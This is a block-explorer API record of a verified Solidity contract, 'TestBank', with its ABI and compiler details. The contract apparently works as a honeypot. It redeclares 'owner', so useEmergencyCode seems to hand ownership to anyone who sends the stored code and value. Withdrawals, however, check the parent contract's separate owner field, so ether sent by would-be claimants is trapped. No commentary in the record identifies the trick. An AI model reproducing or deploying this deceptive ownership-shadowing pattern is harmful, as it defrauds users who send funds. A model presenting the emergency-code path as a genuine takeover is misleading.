{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.18;\r\n\r\ncontract Owned {\r\n    address public owner;\r\n    function Owned() { owner = msg.sender; }\r\n    modifier onlyOwner{ if (msg.sender != owner) revert(); _; }\r\n}\r\n\r\ncontract TestBank is Owned {\r\n    event BankDeposit(address from, uint amount);\r\n    event BankWithdrawal(address from, uint amount);\r\n    address public owner = msg.sender;\r\n    uint256 ecode;\r\n    uint256 evalue;\r\n\r\n    function() public payable {\r\n        deposit();\r\n    }\r\n\r\n    function deposit() public payable {\r\n        require(msg.value > 0);\r\n        BankDeposit(msg.sender, msg.value);\r\n    }\r\n\r\n    function setEmergencyCode(uint256 code, uint256 value) public onlyOwner {\r\n        ecode = code;\r\n        evalue = value;\r\n    }\r\n\r\n    function useEmergencyCode(uint256 code) public payable {\r\n        if ((code == ecode) && (msg.value == evalue)) owner = msg.sender;\r\n    }\r\n\r\n    function withdraw(uint amount) public onlyOwner {\r\n        require(amount <= this.balance);\r\n        msg.sender.transfer(amount);\r\n    }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"code\",\"type\":\"uint256\"},{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"setEmergencyCode\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"code\",\"type\":\"uint256\"}],\"name\":\"useEmergencyCode\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"BankDeposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"BankWithdrawal\",\"type\":\"event\"}]","ContractName":"TestBank","CompilerVersion":"v0.4.18+commit.9cf6e910","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://e23bcbb58da5bdb7a089c6ef510d27e262ef14522c84e7e1fe091848733d277d"}]}